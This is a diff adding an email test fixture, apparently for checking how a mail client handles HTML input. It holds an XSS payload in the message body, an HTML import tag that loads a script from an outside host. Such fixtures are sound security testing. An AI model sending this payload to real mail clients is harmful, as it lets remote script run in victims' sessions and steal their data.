@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: xss_test
+To: victim@wo.com
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
